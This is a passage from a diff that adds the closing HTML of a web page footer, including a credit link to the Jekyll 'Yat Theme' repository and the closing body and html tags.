+      another theme." href="https://github.com/jeffreytse/jekyll-theme-yat">Yat Theme</a>.</div>
+      
+    </div>
+  </div>
+</footer>
+</body>
+</html>
